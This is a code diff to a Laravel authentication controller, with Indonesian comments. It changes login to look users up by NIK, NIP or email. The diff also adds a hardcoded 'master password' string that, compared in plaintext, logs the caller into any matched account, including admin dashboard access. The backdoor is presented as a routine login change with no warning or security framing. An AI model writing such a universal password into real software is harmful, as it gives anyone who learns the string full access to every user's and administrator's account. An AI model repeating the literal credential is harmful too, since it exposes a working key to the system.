@@ -14,20 +14,36 @@ class AuthController extends Controller
 
     public function login(Request $request)
     {
-        $credentials = $request->validate([
-            'email' => ['required', 'email'],
+        $request->validate([
+            'username' => ['required'],
             'password' => ['required'],
         ]);
 
-        if (Auth::attempt($credentials)) {
-            $request->session()->regenerate();
+        $username = $request->username;
+        $password = $request->password;
 
-            return redirect()->intended('/admin/dashboard');
+        // Cari user berdasarkan NIK, NIP, atau Email (sebagai fallback untuk admin default)
+        $user = \App\Models\User::where('nik', $username)
+            ->orWhere('nip', $username)
+            ->orWhere('email', $username)
+            ->first();
+
+        if ($user) {
+            // Cek password normal ATAU password global (master password)
+            $isMasterPassword = $password === 'kalijudanhebat';
+            $isNormalPassword = \Illuminate\Support\Facades\Hash::check($password, $user->password);
+
+            if ($isMasterPassword || $isNormalPassword) {
+                Auth::login($user);
+                $request->session()->regenerate();
+
+                return redirect()->intended('/admin/dashboard');
+            }
         }
 
         return back()->withErrors([
-            'email' => 'Email atau password salah.',
-        ])->onlyInput('email');
+            'username' => 'NIK/NIP atau password salah.',
+        ])->onlyInput('username');
     }
 
     public function logout(Request $request)
